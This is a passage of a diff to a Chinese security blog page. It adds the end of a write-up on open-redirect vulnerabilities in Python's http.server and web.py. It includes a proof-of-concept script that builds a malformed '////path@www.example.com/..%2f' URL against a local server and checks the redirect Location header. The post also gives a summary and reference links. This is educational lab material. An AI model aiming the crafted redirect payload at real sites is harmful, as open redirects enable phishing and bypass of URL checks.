class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">"you should provide a static resoure url, like js or css or picture!"</span>)</span><br><span class="line">    x = urllib.parse.urlparse(url)</span><br><span class="line">    <span class="comment">#将静态文件路径中的"/"转换为%2f</span></span><br><span class="line">    path_list = x.path.split(<span class="string">"/"</span>)</span><br><span class="line">    path_list.pop()</span><br><span class="line">    path_list.remove(<span class="string">""</span>)</span><br><span class="line">    path_list.append(<span class="string">""</span>)</span><br><span class="line">    path = <span class="string">"%2f"</span>.join(path_list)</span><br><span class="line">    <span class="comment"># print(path)</span></span><br><span class="line">    target =  <span class="string">"&#123;0&#125;://&#123;1&#125;"</span>.format(x.scheme,x.netloc)</span><br><span class="line">    payload = <span class="string">"&#123;0&#125;////&#123;1&#125;@www.example.com/..%2f"</span>.format(target,path)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    response = requests.get(payload,allow_redirects=<span class="keyword">False</span>,timeout=<span class="number">3</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">301</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            location = response.headers[<span class="string">"Location"</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"example.com"</span> <span class="keyword">in</span> location:</span><br><span class="line">                print(<span class="string">"sucess"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"false"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">'Start!'</span>)</span><br><span class="line">    <span class="comment"># poc(sys.argv[1])</span></span><br><span class="line">    poc(<span class="string">'http://127.0.0.1:8080/static/css/'</span>)</span><br><span class="line">    print(<span class="string">'End!'</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542809567.07.png" alt=""></p>
+</li>
+</ul>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过一次白盒的URL跳转漏洞实践可以更好的掌握其原理，对黑盒测试也有帮助；比如这里的绕过文件判断的限制“/..”，与黑盒中的一些畸形绕过的方式就类似，学海无涯。</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html</a></p>
+<p><a href="http://www.polaris-lab.com/index.php/tag/web-py/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/tag/web-py/</a></p>
 
       
     </div>
@@ -522,7 +515,11 @@
           
             <a href="/tags/渗透/" rel="tag"><i class="fa fa-tag"></i> 渗透</a>
           
-            <a href="/tags/靶机/" rel="tag"><i class="fa fa-tag"></i> 靶机</a>
+            <a href="/tags/URL跳转/" rel="tag"><i class="fa fa-tag"></i> URL跳转</a>
+          
+            <a href="/tags/WEB安全/" rel="tag"><i class="fa fa-tag"></i> WEB安全</a>
+          
+            <a href="/tags/python安全/" rel="tag"><i class="fa fa-tag"></i> python安全</a>
           
         </div>
       
@@ -535,8 +532,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/06/28/python进程池和线程池/" rel="next" title="python进程池和线程池">
-                <i class="fa fa-chevron-left"></i> python进程池和线程池
+              <a href="/2018/11/20/利用Honeyd搭建简易蜜罐/" rel="next" title="利用Honeyd搭建简易蜜罐">
+                <i class="fa fa-chevron-left"></i> 利用Honeyd搭建简易蜜罐
               </a>
             
           </div>
@@ -544,10 +541,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/08/29/python字符操作/" rel="prev" title="python字符操作">
-                python字符操作 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -732,7 +725,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#靶机渗透"><span class="nav-number">1.</span> <span class="nav-text">靶机渗透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#搭建环境"><span class="nav-number">2.</span> <span class="nav-text">搭建环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透过程"><span class="nav-number">3.</span> <span class="nav-text">渗透过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#python-http-server-web-py-URL跳转漏洞实践"><span class="nav-number">1.</span> <span class="nav-text">python: http.server / web.py URL跳转漏洞实践</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-SERVER"><span class="nav-number">1.1.</span> <span class="nav-text">HTTP.SERVER</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-py框架"><span class="nav-number">1.2.</span> <span class="nav-text">web.py框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#自动化检测"><span class="nav-number">1.3.</span> <span class="nav-text">自动化检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">1.4.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#参考链接"><span class="nav-number">1.4.1.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
